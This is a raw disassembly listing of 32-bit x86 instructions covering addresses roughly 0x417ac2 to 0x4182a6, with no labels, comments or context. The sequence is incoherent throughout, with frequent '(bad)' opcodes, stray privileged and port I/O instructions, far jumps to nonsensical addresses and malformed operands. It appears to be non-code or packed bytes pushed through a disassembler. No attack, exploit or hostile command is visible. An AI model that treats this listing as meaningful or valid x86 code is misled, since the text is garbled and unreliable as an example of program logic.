  417ac2:	or     WORD PTR [ebx-0x2297fea6],0xebd1
  417acb:	repnz test al,0xa0
  417ace:	pusha  
  417acf:	pop    eax
  417ad0:	fnstenv [ebx+edx*1]
  417ad3:	sub    eax,0x77a3c976
  417ad8:	shr    DWORD PTR [esi],cl
  417ada:	lds    edi,FWORD PTR [eax-0x44]
  417add:	(bad)  
  417ade:	and    DWORD PTR [eax-0x11],esi
  417ae1:	bound  ebp,QWORD PTR [edx-0x41]
  417ae4:	pusha  
  417ae5:	gs jmpw 0x33d2
  417aea:	loope  0x417b0b
  417aec:	or     esp,edi
  417aee:	sbb    al,0xa
  417af0:	mov    ecx,0x2494b31b
  417af5:	mov    eax,ds:0xff85a130
  417afa:	adc    al,0x65
  417afc:	mov    ah,0xdc
  417afe:	ss aam 0x21
  417b01:	iret   
  417b02:	and    cl,BYTE PTR [ecx-0x7156be4a]
  417b08:	repnz sar DWORD PTR [esi-0x202a97f4],1
  417b0f:	ss jb  0x417add
  417b12:	jns    0x417b72
  417b14:	add    al,0xc6
  417b16:	jl     0x417ab3
  417b18:	sti    
  417b19:	cmp    BYTE PTR ds:0x42325083,ch
  417b1f:	mov    esi,0xd4e1c2d5
  417b24:	mov    ah,0xf9
  417b26:	stos   BYTE PTR es:[edi],al
  417b27:	lock xchg DWORD PTR [eax],esi
  417b2a:	nop
  417b2b:	mov    edx,0x980248ab
  417b30:	mov    al,ds:0x3a3e263f
  417b35:	in     al,0xb7
  417b37:	and    eax,0xcd10fcd2
  417b3c:	xlat   BYTE PTR ds:[ebx]
  417b3d:	jmp    0x435d83e2
  417b42:	daa    
  417b43:	sub    al,0x37
  417b45:	inc    ebx
  417b46:	adc    al,0x48
  417b48:	loopne 0x417b44
  417b4a:	loope  0x417b53
  417b4c:	repnz out dx,eax
  417b4e:	and    BYTE PTR [eax-0x1039edf2],0x9c
  417b55:	(bad)  
  417b56:	rcr    BYTE PTR [edx],cl
  417b58:	jl     0x417b1a
  417b5a:	sub    edi,DWORD PTR [esi]
  417b5c:	call   0xe6b3:0xf85fb549
  417b63:	pusha  
  417b64:	minps  xmm4,XMMWORD PTR [eax+ebp*4-0x5e]
  417b69:	lods   eax,DWORD PTR ds:[esi]
  417b6a:	sysexit 
  417b6c:	je     0x417be5
  417b6e:	cld    
  417b6f:	sbb    eax,0xb23723f4
  417b74:	retf   0x43dc
  417b77:	jle    0x417b47
  417b79:	and    ah,BYTE PTR [edi]
  417b7b:	cld    
  417b7c:	popf   
  417b7d:	push   ds
  417b7e:	xchg   DWORD PTR [eax+0x71ae448d],ebx
  417b84:	scas   eax,DWORD PTR es:[edi]
  417b85:	mov    al,ds:0x43ba3a97
  417b8a:	sbb    BYTE PTR [esi+esi*8-0xa875ffb],0x45
  417b92:	inc    edi
  417b93:	jb     0x417ba1
  417b95:	dec    esp
  417b96:	add    eax,0x2503d1db
  417b9b:	dec    eax
  417b9c:	xchg   edi,eax
  417b9d:	pop    edx
  417b9e:	add    dh,BYTE PTR [ebp+0x55]
  417ba1:	xor    DWORD PTR [edx-0x2ae7c35e],esp
  417ba7:	(bad)  
  417ba8:	push   ebx
  417ba9:	std    
  417baa:	push   0xf629d706
  417baf:	fucomip st,st(7)
  417bb1:	scas   al,BYTE PTR es:[edi]
  417bb2:	repz push edx
  417bb4:	cwde   
  417bb5:	mov    cs,WORD PTR [ecx-0x16]
  417bb8:	sub    DWORD PTR [edx],esp
  417bba:	or     al,0x8
  417bbc:	mov    esp,DWORD PTR [ebx-0x40]
  417bbf:	adc    BYTE PTR [edi-0xb],dh
  417bc2:	push   edx
  417bc3:	push   0xcc780dc9
  417bc8:	mov    dl,0x20
  417bca:	sbb    ebp,DWORD PTR [ebx-0x44]
  417bcd:	mov    ds:0x1cc830d6,eax
  417bd2:	xor    eax,edi
  417bd4:	inc    esp
  417bd5:	inc    ebp
  417bd6:	gs push 0xffffffa6
  417bd9:	imul   edi,DWORD PTR ds:0x35c648f8,0xfffffff2
  417be0:	(bad)  
  417be2:	jns    0x417c0b
  417be4:	iret   
  417be5:	inc    ecx
  417be6:	cmp    eax,0xc58bf30
  417beb:	mov    dl,0x4d
  417bed:	cmc    
  417bee:	imul   ebp,DWORD PTR [esi],0xd8dd5276
  417bf4:	cli    
  417bf5:	pop    ebp
  417bf6:	xchg   esp,eax
  417bf7:	or     ecx,DWORD PTR ds:0xc9113bab
  417bfd:	pop    edi
  417bfe:	or     BYTE PTR [ebx],cl
  417c00:	mov    ds:0xed284061,eax
  417c05:	pop    edi
  417c06:	xchg   esi,eax
  417c07:	sbb    al,0x83
  417c09:	shl    DWORD PTR [ebx+ebp*2+0x7b],cl
  417c0d:	fwait
  417c0e:	sti    
  417c0f:	cmp    BYTE PTR [eax],0x59
  417c12:	mov    ah,0x69
  417c14:	cli    
  417c15:	mov    bh,0x36
  417c17:	dec    ebx
  417c18:	loope  0x417bae
  417c1a:	mov    edx,ebx
  417c1c:	fistp  QWORD PTR [ecx]
  417c1e:	inc    ecx
  417c1f:	and    eax,DWORD PTR [bp+di+0x4f33]
  417c24:	jmp    0x1ebb3bef
  417c29:	pop    edx
  417c2a:	stos   BYTE PTR es:[edi],al
  417c2b:	ins    BYTE PTR es:[edi],dx
  417c2c:	cdq    
  417c2d:	pxor   mm3,mm3
  417c30:	(bad)  
  417c31:	mov    gs,WORD PTR [ecx+0x47]
  417c34:	cld    
  417c35:	pop    ss
  417c36:	mov    cl,0x40
  417c38:	loope  0x417c9f
  417c3a:	push   esp
  417c3b:	adc    al,BYTE PTR [ecx]
  417c3d:	outs   dx,DWORD PTR ds:[esi]
  417c3e:	stc    
  417c3f:	jo     0x417bee
  417c41:	dec    sp
  417c43:	push   ss
  417c44:	mov    ds:0x5fefc2b0,eax
  417c49:	cmp    esi,esi
  417c4b:	fst    QWORD PTR [ecx+0x583e2b92]
  417c51:	xchg   esi,eax
  417c52:	int3   
  417c53:	pop    es
  417c54:	jle    0x417c58
  417c56:	cmp    al,0x7d
  417c58:	dec    ebp
  417c59:	mov    cl,0xb4
  417c5b:	mov    ds:0xc9d7145e,al
  417c60:	test   eax,0xfd527432
  417c65:	aas    
  417c66:	cmp    ecx,DWORD PTR [edx]
  417c68:	lods   eax,DWORD PTR ds:[esi]
  417c69:	xchg   ecx,eax
  417c6a:	ficom  DWORD PTR [ecx-0x2a]
  417c6d:	out    0x13,eax
  417c6f:	in     eax,dx
  417c70:	addr16 mov eax,ds:0x4d46
  417c74:	outs   dx,BYTE PTR ds:[esi]
  417c75:	add    edx,esi
  417c77:	xchg   BYTE PTR [ebp-0x31f453ad],dl
  417c7d:	ins    BYTE PTR es:[edi],dx
  417c7e:	xchg   edi,eax
  417c7f:	(bad)  
  417c81:	mov    esi,DWORD PTR [ebx+edx*8]
  417c84:	(bad)  
  417c85:	pop    esi
  417c86:	mov    al,0x48
  417c88:	sti    
  417c89:	add    DWORD PTR [esi+edi*1],edx
  417c8c:	jmp    0x1854c539
  417c91:	stos   BYTE PTR es:[edi],al
  417c92:	das    
  417c93:	aam    0x31
  417c95:	or     DWORD PTR [ecx],esp
  417c97:	pop    edi
  417c98:	into   
  417c99:	test   BYTE PTR [ecx-0x2b],0x45
  417c9d:	inc    ebx
  417c9e:	jmp    0x3b57:0x976cfef8
  417ca5:	mov    DWORD PTR [edi+0x57d0d3e2],ebx
  417cab:	mov    edi,0x5136a2cb
  417cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cb1:	mov    ds:0x1ec98b62,eax
  417cb6:	into   
  417cb7:	or     DWORD PTR [edi],esi
  417cb9:	jno    0x417d2d
  417cbb:	sub    eax,0x9b8c909c
  417cc0:	push   ecx
  417cc1:	dec    ebx
  417cc2:	(bad)  
  417cc3:	jg     0x417c79
  417cc5:	ret    0xc6b6
  417cc8:	(bad)  
  417cc9:	xchg   esi,eax
  417cca:	cmp    eax,DWORD PTR [ebp+0x3c]
  417ccd:	xor    esp,DWORD PTR [eax+edi*8-0x7569207d]
  417cd4:	push   edx
  417cd5:	imul   edi,DWORD PTR [ecx],0xffffffaf
  417cd8:	sub    al,0x54
  417cda:	cli    
  417cdb:	imul   ebx,DWORD PTR [eax],0xffffff95
  417cde:	xor    al,0x29
  417ce0:	or     eax,DWORD PTR [ebx+ebx*4]
  417ce3:	sub    dh,ch
  417ce5:	scas   eax,DWORD PTR es:[edi]
  417ce6:	or     DWORD PTR [ebx+ebx*1+0x4827e3c7],ecx
  417ced:	push   edx
  417cee:	es mov eax,0xdc1cfc1a
  417cf4:	sbb    eax,0x4755c6e1
  417cf9:	out    dx,al
  417cfa:	sbb    BYTE PTR [edx+0x1b],0x3
  417cfe:	das    
  417cff:	and    al,0x2d
  417d01:	call   0xbb2f:0x1ebc693f
  417d08:	call   0x74b6:0xc636e3df
  417d0f:	mov    ds:0x57606e13,eax
  417d14:	mov    ds:0xd37e7775,eax
  417d19:	and    eax,0xc179f2ce
  417d1e:	cs inc ecx
  417d20:	mov    dl,0x81
  417d22:	pop    ss
  417d23:	les    ebx,FWORD PTR [edx+edi*2+0x5823092e]
  417d2a:	adc    DWORD PTR [ecx-0x4],ecx
  417d2d:	lea    edx,[ebp-0x4b4bc9e8]
  417d33:	sbb    ah,BYTE PTR [ebp-0xa662e9c]
  417d39:	add    eax,0x28a830fd
  417d3e:	push   eax
  417d3f:	add    BYTE PTR [ebp+ecx*8-0x1b],0xa6
  417d44:	mov    cl,dh
  417d46:	rcr    BYTE PTR [bx-0x7f37],0x63
  417d4c:	test   al,0xdd
  417d4e:	xchg   ebx,eax
  417d4f:	xchg   ebx,eax
  417d50:	and    bl,bh
  417d52:	ret    0x1509
  417d55:	mov    edx,0x77bdede8
  417d5a:	pop    es
  417d5b:	xchg   ebp,eax
  417d5c:	xchg   edi,eax
  417d5d:	push   edx
  417d5e:	jne    0x417d27
  417d60:	push   esp
  417d61:	nop
  417d62:	mov    ds:0xbf86d41,eax
  417d67:	pop    ss
  417d68:	jne    0x417d98
  417d6a:	jmp    0xdd7e:0x41080294
  417d71:	std    
  417d72:	test   ebp,edi
  417d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d75:	mov    dl,0xb
  417d77:	jns    0x417d12
  417d79:	int3   
  417d7a:	jmp    0x7f10a7f8
  417d7f:	jmp    0x417de9
  417d81:	jbe    0x417d8f
  417d83:	imul   eax,DWORD PTR [eax-0x6245a0b1],0xffffff8a
  417d8a:	ds mov bl,0xef
  417d8d:	push   ebx
  417d8e:	shl    BYTE PTR [edx],1
  417d90:	or     bh,BYTE PTR fs:0xd23ff979
  417d97:	cmp    eax,0xfe8467d7
  417d9c:	and    eax,0xc9bbc58e
  417da1:	jo     0x417d35
  417da3:	dec    eax
  417da4:	je     0x2478898c
  417daa:	scas   al,BYTE PTR es:[edi]
  417dab:	je     0x417dfc
  417dad:	mov    cs,WORD PTR [edx+0x29]
  417db0:	in     eax,dx
  417db1:	shr    BYTE PTR [ecx+0x13097d0],0x4c
  417db8:	and    DWORD PTR [esi-0x55235df7],ebx
  417dbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dbf:	and    BYTE PTR [ecx+ebp*2+0x500e84f3],dh
  417dc6:	rol    BYTE PTR ds:0xe3b3d9,cl
  417dcc:	stc    
  417dcd:	sub    ah,bl
  417dcf:	or     esp,edx
  417dd1:	fidiv  DWORD PTR [esi+0x474774be]
  417dd7:	stc    
  417dd8:	mov    fs,WORD PTR [edi-0x38]
  417ddb:	xchg   BYTE PTR [ebx],bl
  417ddd:	pop    ss
  417dde:	in     al,0xf
  417de0:	mov    esp,0xda0ec40a
  417de5:	mov    ah,0x7c
  417de7:	cmp    al,0xc8
  417de9:	add    ecx,DWORD PTR [ecx-0x2c]
  417dec:	cs (bad) 
  417dee:	jb     0x417e09
  417df0:	pop    edx
  417df1:	sbb    ah,BYTE PTR [esi-0x24]
  417df4:	cmp    DWORD PTR ds:0xa4f1acf2,ebx
  417dfa:	or     al,0x51
  417dfc:	cld    
  417dfd:	mov    ds:0x6f3da4a8,al
  417e02:	enter  0x82a5,0x26
  417e06:	xor    al,0xde
  417e08:	adc    esi,DWORD PTR [ebp+ebp*8-0xd84b2ca]
  417e0f:	(bad)  
  417e10:	retf   0x171c
  417e13:	dec    eax
  417e14:	sub    BYTE PTR [ebp+0xd],bh
  417e17:	jo     0x417e1d
  417e19:	push   0x37
  417e1b:	out    0x4d,eax
  417e1d:	or     ebp,ebx
  417e1f:	mov    bh,0xd3
  417e21:	mov    edx,0xe11a1dfa
  417e26:	shl    DWORD PTR [eax+ebx*2+0x2aaa92ae],1
  417e2d:	imul   esi,DWORD PTR [edx-0x120264d3],0x7b
  417e34:	jne    0x417e5c
  417e36:	pop    edi
  417e37:	push   cs
  417e38:	inc    edx
  417e39:	data16 or BYTE PTR es:[ebx-0x61],cl
  417e3e:	sbb    BYTE PTR [eax-0x69],bl
  417e41:	xchg   edi,eax
  417e42:	aaa    
  417e43:	push   ds
  417e44:	jp     0x417e72
  417e46:	ds and al,0x9
  417e49:	scas   eax,DWORD PTR es:[edi]
  417e4a:	adc    BYTE PTR [edi+0x55],ah
  417e4d:	lds    edi,FWORD PTR [eax+eiz*2+0x67]
  417e51:	ret    
  417e52:	bound  eax,QWORD PTR [edx]
  417e54:	xor    BYTE PTR [edx*2+0x6749eca9],0xe8
  417e5c:	mov    eax,0x6796e40a
  417e61:	sub    al,0x20
  417e63:	adc    bh,BYTE PTR [ecx+0x22877324]
  417e69:	retf   0xef81
  417e6c:	test   DWORD PTR [eax-0x40],0x4d034498
  417e73:	xor    eax,0x5164ec5d
  417e78:	add    BYTE PTR [edi],ah
  417e7a:	jecxz  0x417edc
  417e7c:	pop    ss
  417e7d:	outs   dx,BYTE PTR ds:[esi]
  417e7e:	and    eax,0x2272178b
  417e83:	cmp    ebx,DWORD PTR [esi]
  417e85:	(bad)  
  417e86:	call   0x4ddb0922
  417e8b:	and    DWORD PTR [ebp-0x6e],ebx
  417e8e:	jo     0x417e6b
  417e90:	lds    edi,FWORD PTR [esi+0x4aa54786]
  417e96:	xor    ecx,DWORD PTR [esi]
  417e98:	dec    esi
  417e99:	or     BYTE PTR [ebx+0x73],ch
  417e9c:	jmp    0x417e69
  417e9e:	fwait
  417e9f:	jle    0x417ee8
  417ea1:	stos   DWORD PTR es:[edi],eax
  417ea2:	pushf  
  417ea3:	cmp    eax,0x53194f29
  417ea8:	xchg   ebp,eax
  417ea9:	sub    al,0x9
  417eab:	(bad)  
  417eac:	(bad)  
  417ead:	jmp    0xc9ab7dfa
  417eb2:	jge    0x417e40
  417eb4:	jne    0x417ed9
  417eb6:	std    
  417eb7:	adc    al,BYTE PTR [ebx-0x41]
  417eba:	mov    esp,0xf0e021a8
  417ebf:	and    esp,DWORD PTR [esi+eiz*8-0x13]
  417ec3:	stos   BYTE PTR es:[edi],al
  417ec4:	in     eax,dx
  417ec5:	repz mov ch,0x4e
  417ec8:	shl    ebx,0xb7
  417ecb:	lock arpl WORD PTR [edx+0x39816ab1],bp
  417ed2:	sbb    DWORD PTR [ecx-0x12],esp
  417ed5:	test   DWORD PTR [esi],ebx
  417ed7:	in     eax,dx
  417ed8:	loopne 0x417f46
  417eda:	(bad)  
  417edc:	aam    0x63
  417ede:	aam    0x17
  417ee0:	add    eax,0x4261211e
  417ee5:	lds    ecx,FWORD PTR cs:[edx+0x12]
  417ee9:	pop    es
  417eea:	aas    
  417eeb:	adc    ah,BYTE PTR [esi-0x10]
  417eee:	mov    cs,WORD PTR [ecx-0x33]
  417ef1:	sar    BYTE PTR [edx+0x2884b1db],cl
  417ef7:	jge    0x417f32
  417ef9:	push   ebp
  417efa:	pop    ebp
  417efb:	pop    ebx
  417efc:	adc    eax,0x9bb20cdd
  417f01:	add    eax,0x87323705
  417f06:	shl    BYTE PTR [esi-0x312b3d83],1
  417f0c:	push   eax
  417f0d:	icebp  
  417f0e:	jns    0x417f8f
  417f10:	std    
  417f11:	jb     0x417ed5
  417f13:	cs stos DWORD PTR es:[edi],eax
  417f15:	ins    BYTE PTR es:[edi],dx
  417f16:	pop    ds
  417f17:	mov    ah,0xde
  417f19:	jns    0x417ee1
  417f1b:	jb     0x417f41
  417f1d:	cwde   
  417f1e:	out    dx,al
  417f1f:	sub    al,0x1f
  417f21:	dec    ebp
  417f22:	int3   
  417f23:	mov    WORD PTR [edi],ss
  417f25:	pop    edi
  417f26:	sub    al,0x63
  417f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f29:	xchg   edx,eax
  417f2a:	pop    eax
  417f2b:	bound  esi,QWORD PTR [esp+ebx*8-0x284d8fbf]
  417f32:	ds xchg edx,eax
  417f34:	cmp    BYTE PTR [ecx-0x4a],bl
  417f37:	dec    esi
  417f38:	jnp    0x417f41
  417f3a:	pop    DWORD PTR [ecx]
  417f3c:	shl    BYTE PTR [edi-0x38],1
  417f3f:	adc    bh,BYTE PTR [eax+eax*4+0x296d7a99]
  417f46:	xor    ecx,DWORD PTR [ebp-0x14]
  417f49:	fdivr  st,st(5)
  417f4b:	call   ebp
  417f4d:	cmp    DWORD PTR [esi-0x7],esi
  417f50:	ja     0x417fa3
  417f52:	and    bh,BYTE PTR [ebx-0x65d49f50]
  417f58:	mov    gs,WORD PTR [ebx+0x46]
  417f5b:	inc    ebx
  417f5c:	mov    ecx,es
  417f5e:	jnp    0x417f86
  417f60:	sbb    DWORD PTR [eax+edi*8-0x2b],edi
  417f64:	adc    eax,0x79ac939d
  417f69:	out    0xfd,eax
  417f6b:	pop    edi
  417f6c:	cs xchg ecx,eax
  417f6e:	xchg   esp,eax
  417f6f:	fcom   QWORD PTR [ebx+0x67]
  417f72:	repnz adc bl,BYTE PTR [esi+esi*1]
  417f76:	or     BYTE PTR [eax-0x57355de0],al
  417f7c:	loop   0x417f3f
  417f7e:	add    cl,BYTE PTR [edi+0x6f]
  417f81:	add    al,0x88
  417f83:	xor    DWORD PTR [esi+0x40a24574],edx
  417f89:	(bad)  
  417f8a:	cmc    
  417f8b:	(bad)  
  417f8c:	fs push ebp
  417f8e:	retf   0xc77b
  417f91:	mov    bl,BYTE PTR [eax+0xc2b071e]
  417f97:	push   edi
  417f98:	cmp    DWORD PTR [esi],ebp
  417f9a:	push   ebp
  417f9b:	in     eax,dx
  417f9c:	mul    DWORD PTR [ebp-0x41]
  417f9f:	je     0x418001
  417fa1:	lods   eax,DWORD PTR ds:[esi]
  417fa2:	lock cmp ecx,ebp
  417fa5:	scas   al,BYTE PTR es:[edi]
  417fa6:	(bad)  ds:0x617b285b
  417fac:	mov    DWORD PTR [ebx+ebx*8-0x4d],ebx
  417fb0:	or     eax,0xa23ac338
  417fb5:	dec    ecx
  417fb6:	sub    ch,BYTE PTR [esi+0x28]
  417fb9:	jmp    0x417f4f
  417fbb:	popf   
  417fbc:	xchg   ebp,eax
  417fbd:	sbb    DWORD PTR [edi+0x2064f5a],0x48c28d89
  417fc7:	or     dl,BYTE PTR [ebx]
  417fc9:	dec    edx
  417fca:	out    0x97,al
  417fcc:	mov    eax,ds:0x18e99c4f
  417fd1:	xchg   ebp,eax
  417fd2:	mov    dl,0xaa
  417fd4:	pusha  
  417fd5:	push   edx
  417fd6:	cmp    al,0x98
  417fd8:	jne    0x417f8b
  417fda:	(bad)  
  417fdb:	or     DWORD PTR [ecx+0x7e],ebp
  417fde:	dec    edx
  417fdf:	loope  0x417fda
  417fe1:	mov    eax,ds:0xadfc00a4
  417fe6:	sbb    BYTE PTR [ebx+0x1279e200],dl
  417fec:	das    
  417fed:	cmc    
  417fee:	mov    cl,0x37
  417ff0:	sub    DWORD PTR [edx],ebp
  417ff2:	fxtract 
  417ff4:	scas   eax,DWORD PTR es:[edi]
  417ff5:	ret    
  417ff6:	dec    ecx
  417ff7:	leave  
  417ff8:	dec    ebp
  417ff9:	loop   0x417fd3
  417ffb:	pop    esi
  417ffc:	cdq    
  417ffd:	add    eax,0xc6370cd9
  418002:	jecxz  0x417f84
  418004:	jl     0x417fc9
  418006:	mov    dh,0xa0
  418008:	dec    esp
  418009:	imul   esp,DWORD PTR [edi-0x16],0xd8d1353e
  418010:	repz shl DWORD PTR [ebp+0x5eec5b07],1
  418017:	jg     0x417ff0
  418019:	pushf  
  41801a:	sbb    esi,DWORD PTR [esi-0x19fcb2c7]
  418020:	loop   0x417fb9
  418022:	push   edi
  418023:	int3   
  418024:	push   cs
  418025:	scas   eax,DWORD PTR es:[edi]
  418026:	(bad)  
  418027:	mov    ds:0xdf5bb15c,eax
  41802c:	or     al,0xa0
  41802e:	ss and eax,0xa70f699b
  418034:	aad    0xe7
  418036:	inc    esi
  418037:	inc    ebp
  418038:	mov    ds:0x4aea176e,al
  41803d:	sub    dl,BYTE PTR [ebx+0x12]
  418040:	dec    esp
  418041:	pop    esp
  418042:	(bad)  
  418043:	mov    dl,0x65
  418045:	mov    WORD PTR [eax-0x59],ss
  418048:	arpl   WORD PTR [ecx+0x1c],si
  41804b:	inc    BYTE PTR [ebp+eiz*1-0x75dbfd30]
  418052:	test   al,al
  418054:	jmp    0xd3f:0x775e3486
  41805b:	ret    
  41805c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41805d:	pop    ebp
  41805e:	mov    al,ds:0x88d28aef
  418063:	std    
  418064:	repz dec ebp
  418066:	xchg   ecx,eax
  418067:	stc    
  418068:	test   BYTE PTR [ecx],al
  41806a:	mov    ebp,DWORD PTR [edi]
  41806c:	or     DWORD PTR [esi-0x24],0x65
  418070:	and    DWORD PTR [edx-0x57f09340],ebp
  418076:	dec    esp
  418077:	call   0x722f5e80
  41807c:	das    
  41807d:	shr    BYTE PTR [eax],cl
  41807f:	mov    ds:0x16782b05,eax
  418084:	fwait
  418085:	dec    ebp
  418086:	out    0xf7,eax
  418088:	add    ecx,DWORD PTR [esi+0x7ed17233]
  41808e:	sahf   
  41808f:	scas   al,BYTE PTR es:[edi]
  418090:	jae    0x4180c4
  418092:	push   edx
  418093:	bound  ecx,QWORD PTR [ebx+esi*2+0xd]
  418097:	and    al,BYTE PTR [edi-0x480242e4]
  41809d:	ds loope 0x418063
  4180a0:	inc    ebx
  4180a1:	outs   dx,BYTE PTR ds:[esi]
  4180a2:	add    DWORD PTR [eax-0x3a],edx
  4180a5:	or     ah,BYTE PTR [eax+0x731689ea]
  4180ab:	aaa    
  4180ac:	cmp    esp,esi
  4180ae:	retf   0xa64c
  4180b1:	test   bh,dl
  4180b3:	nop    DWORD PTR ds:0x1636340a
  4180ba:	stc    
  4180bb:	add    BYTE PTR [edi],bh
  4180bd:	jno    0x4180a0
  4180bf:	cmp    eax,0x714964db
  4180c4:	cmp    eax,0xf8e1c32f
  4180c9:	ret    0x811f
  4180cc:	in     al,0x7
  4180ce:	add    BYTE PTR [ecx],0xfb
  4180d1:	aas    
  4180d2:	sub    al,0x68
  4180d4:	cmp    edi,DWORD PTR [edi+ebx*1]
  4180d7:	push   esp
  4180d8:	mov    ch,al
  4180da:	and    BYTE PTR [eax-0x61],dl
  4180dd:	cmp    ch,BYTE PTR [ecx+0xd]
  4180e0:	ficom  WORD PTR [ecx-0x4523d419]
  4180e6:	cmp    al,0x1a
  4180e8:	pop    edi
  4180e9:	pop    ss
  4180ea:	pusha  
  4180eb:	daa    
  4180ec:	gs loop 0x4180ed
  4180ef:	jmp    0x418108
  4180f1:	xchg   ebx,eax
  4180f2:	ficomp DWORD PTR [esi]
  4180f4:	dec    esi
  4180f5:	imul   edi,DWORD PTR ds:0xfe37cc86,0xfb140952
  4180ff:	fld    QWORD PTR [ebx]
  418101:	push   ebx
  418102:	(bad)  
  418103:	inc    edx
  418104:	push   esp
  418105:	add    eax,0xf02bf83f
  41810a:	inc    ecx
  41810b:	data16 fld DWORD PTR [eax+ebp*8]
  41810f:	bound  edi,QWORD PTR [ebx]
  418111:	xchg   ebx,eax
  418112:	iret   
  418113:	push   cs
  418114:	sub    DWORD PTR [edx-0x51306487],eax
  41811a:	ss pop eax
  41811c:	jno    0x41815d
  41811e:	mov    BYTE PTR [edi+0xf],bl
  418121:	fmul   QWORD PTR [ebp+eiz*4+0x1d]
  418125:	das    
  418126:	cli    
  418127:	fild   WORD PTR [edx+esi*8+0x11]
  41812b:	sti    
  41812c:	clc    
  41812d:	cwde   
  41812e:	sub    cl,ch
  418130:	mov    esi,0x6b552a79
  418135:	push   0x5c
  418137:	rol    DWORD PTR [ebx+0x1c37f4b9],1
  41813d:	dec    edi
  41813e:	ficomp WORD PTR ds:0x1e35c2a2
  418144:	or     DWORD PTR [edi],edi
  418146:	or     eax,0x720c810
  41814b:	push   ebx
  41814c:	pop    esp
  41814d:	mov    al,0x1a
  41814f:	push   0x39b28c0a
  418154:	into   
  418155:	lods   al,BYTE PTR ds:[esi]
  418156:	push   ds
  418157:	mov    bh,0x64
  418159:	jns    0x4180fb
  41815b:	xlat   BYTE PTR ds:[ebx]
  41815c:	push   ebp
  41815d:	and    al,0x6b
  41815f:	jnp    0x418194
  418161:	push   ss
  418162:	or     dl,bl
  418164:	jg     0x4181ab
  418166:	jmp    0x3492b374
  41816b:	sahf   
  41816c:	adc    ecx,DWORD PTR [edx-0x3b78f197]
  418172:	(bad)  
  418173:	xchg   edx,eax
  418174:	imul   esi,DWORD PTR [ebp-0x13],0x4a3bb119
  41817b:	cmc    
  41817c:	and    bl,BYTE PTR [esi+0x78fd8a23]
  418182:	mov    eax,ds:0xf2f82b9a
  418187:	cld    
  418188:	cmp    dl,BYTE PTR [ecx-0x7f]
  41818b:	mov    eax,ds:0xcbb2dce1
  418190:	or     dl,BYTE PTR [edx]
  418192:	jg     0x418144
  418194:	les    eax,FWORD PTR ds:0x20fd7033
  41819a:	mov    eax,0xc4e32a34
  41819f:	lods   eax,DWORD PTR ds:[esi]
  4181a0:	out    dx,al
  4181a1:	and    al,0xe2
  4181a3:	and    ecx,ebx
  4181a5:	(bad)  [ebx]
  4181a7:	je     0x4181fc
  4181a9:	pop    ds
  4181aa:	xor    eax,0x8b65a54c
  4181af:	and    cl,0x14
  4181b2:	fucom  st(6)
  4181b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181b5:	sbb    eax,0xa0e92c20
  4181ba:	cmc    
  4181bb:	mov    al,0x3e
  4181bd:	xlat   BYTE PTR ds:[ebx]
  4181be:	fnstcw WORD PTR [esi]
  4181c0:	jbe    0x41821e
  4181c2:	sub    bp,WORD PTR ds:0x5a6f4103
  4181c9:	mov    ?,WORD PTR [edx+0x7b]
  4181cc:	imul   edi,DWORD PTR [edi+0x54740563],0x7b
  4181d3:	sub    eax,0x5f08fc90
  4181d8:	mov    BYTE PTR [eax],dh
  4181da:	xchg   ecx,eax
  4181db:	mov    ebx,0xf33d15c1
  4181e0:	in     al,dx
  4181e1:	pop    edx
  4181e2:	jmp    0x41819e
  4181e4:	and    esp,ebp
  4181e6:	and    eax,0x1871d1e3
  4181eb:	jne    0x4181f0
  4181ed:	cmc    
  4181ee:	loop   0x41819b
  4181f0:	add    eax,0x522daff
  4181f5:	inc    edx
  4181f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181f7:	jl     0x418251
  4181f9:	sbb    BYTE PTR [eax+0x3de1500f],dh
  4181ff:	and    BYTE PTR [esi+esi*2],0x4e
  418203:	and    BYTE PTR [edi+edi*2-0x2b],ch
  418207:	cmp    al,0x56
  418209:	bound  ebx,QWORD PTR [ecx+ebp*8-0x7b01419a]
  418210:	pop    es
  418211:	out    0x3e,al
  418213:	sbb    al,0xe9
  418215:	jg     0x41828c
  418217:	jne    0x4181d2
  418219:	add    dh,bl
  41821b:	xor    DWORD PTR [eax],edi
  41821d:	jne    0x418244
  41821f:	mov    ds:0xd0fc9f38,eax
  418224:	mov    eax,0x2c6dd9a5
  418229:	popa   
  41822a:	pop    esi
  41822b:	add    ebp,esi
  41822d:	jbe    0x418230
  41822f:	fst    DWORD PTR [edi-0x23c45781]
  418235:	retf   0x3422
  418238:	xchg   edi,eax
  418239:	jmp    DWORD PTR ds:0x218e77a8
  41823f:	jbe    0x418228
  418241:	pop    eax
  418242:	iret   
  418243:	mov    al,0x3f
  418245:	test   BYTE PTR [edx-0x48faa94b],bh
  41824b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41824c:	mov    ds:0x8761343c,eax
  418251:	or     al,BYTE PTR [ecx+0x3fd961ee]
  418257:	ret    0x1120
  41825a:	jb     0x4182ab
  41825c:	xchg   ebp,eax
  41825d:	push   ds
  41825e:	sub    al,bh
  418260:	jecxz  0x41824b
  418262:	popa   
  418263:	xchg   ebx,eax
  418264:	in     eax,0x91
  418266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418267:	inc    esp
  418268:	and    al,0x43
  41826a:	xchg   cl,ah
  41826c:	add    DWORD PTR [ecx],edx
  41826e:	(bad)  
  41826f:	cwde   
  418270:	leave  
  418271:	paddsw mm4,QWORD PTR [ebp-0x75b3541b]
  418278:	add    BYTE PTR [esi+ecx*8],0x8d
  41827c:	inc    ecx
  41827d:	mov    eax,0x94280db8
  418282:	scas   al,BYTE PTR es:[edi]
  418283:	scas   eax,DWORD PTR es:[edi]
  418284:	test   bl,cl
  418286:	mov    dl,0xbf
  418288:	hlt    
  418289:	lea    esi,[edx+0x16]
  41828c:	pushf  
  41828d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41828e:	fwait
  41828f:	mov    dl,0x8d
  418291:	mov    ?,WORD PTR ds:0x7f594a6d
  418297:	push   esi
  418298:	pop    ds
  418299:	out    0xaa,al
  41829b:	cmp    BYTE PTR [eax],al
  41829d:	add    al,BYTE PTR [eax+eax*1+0x4192d1a4]
  4182a4:	jae    0x418241
  4182a6:	out    0x76,al
